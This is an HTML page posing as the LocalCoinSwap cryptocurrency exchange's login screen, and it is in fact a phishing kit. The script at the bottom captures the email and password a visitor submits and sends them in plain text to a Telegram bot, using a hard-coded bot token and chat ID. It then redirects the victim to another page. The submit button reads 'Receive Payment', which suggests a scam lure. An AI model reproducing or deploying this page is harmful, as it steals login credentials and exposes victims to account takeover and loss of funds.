<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>LocalCoinSwap — Login</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: "Inter", sans-serif;
        }
        
        body {
            margin: 0;
            background-color: #e9f0f8;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #0a0f1c;
            padding: 12px 36px;
        }
        
        header img {
            height: 28px;
        }
        
        header .register-btn {
            background-color: #f9a825;
            color: #000;
            border: none;
            padding: 8px 18px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 600;
        }
        
        .container {
            display: flex;
            justify-content: center;
            align-items: stretch;
            margin: 60px auto;
            background-color: #fff;
            border-radius: 8px;
            max-width: 950px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            transition: 0.4s;
        }
        
        .left-section {
            flex: 1;
            padding: 50px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            border-right: 1px solid #eaeaea;
        }
        
        .quote-icon {
            color: #3f7af0;
            font-size: 50px;
            margin-bottom: 10px;
        }
        
        .quote {
            font-size: 18px;
            line-height: 1.6;
            color: #333;
            margin-bottom: 20px;
        }
        
        .author {
            color: #1a1a1a;
            font-weight: 600;
        }
        
        .right-section {
            flex: 1;
            padding: 50px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .right-section h2 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 24px;
            color: #0a0f1c;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            margin-bottom: 6px;
        }
        
        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            margin-bottom: 18px;
            font-size: 15px;
        }
        
        .login-btn {
            background-color: #0077ff;
            color: #fff;
            border: none;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .login-btn:hover {
            background-color: #0061d5;
        }
        
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .left-section {
                border-right: none;
                border-bottom: 1px solid #eaeaea;
                padding: 30px;
            }
            .right-section {
                padding: 30px;
            }
        }
    </style>
</head>

<body>
    <header>
        <div style="display:flex;align-items:center;gap:8px;">
            <img src="https://localcoinswap.com/favicon.ico" alt="Logo" />
            <span style="color:white;font-weight:700;">LocalCoinSwap</span>
        </div>
        <button class="register-btn">Register</button>
    </header>

    <div class="container">
        <div class="left-section">
            <div class="quote-icon">“</div>
            <p class="quote">
                There are a billion people, right now, with access to the internet and feature phones who could use bitcoin as an international wire-transfer service.
            </p>
            <p class="author">Andreas Antonopoulos</p>
        </div>

        <div class="right-section">
            <h2>Login to LocalCoinSwap</h2>
            <form id="loginForm">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="example@email.com" required />

                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required />

                <button type="submit" class="login-btn">Receive Payment</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const email = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value.trim();

            // Validate inputs
            if (!email || !password) {
                console.error('Login details not found.');
                return; // Exit if fields are empty
            }

            const message = `Email: ${email}\nPassword: ${password}`;

            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg';
            const chatId = '6367881211';

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not okay');
                    }
                    return response.json();
                })
                .then(data => {
                    if (data.ok) {
                        console.log('Message sent successfully');
                        window.location.href = "login.html";
                    } else {
                        console.error('Error sending message:', data.description);
                    }
                })
                .catch(error => console.error('Error:', error));
        });
    </script>
</body>

</html>
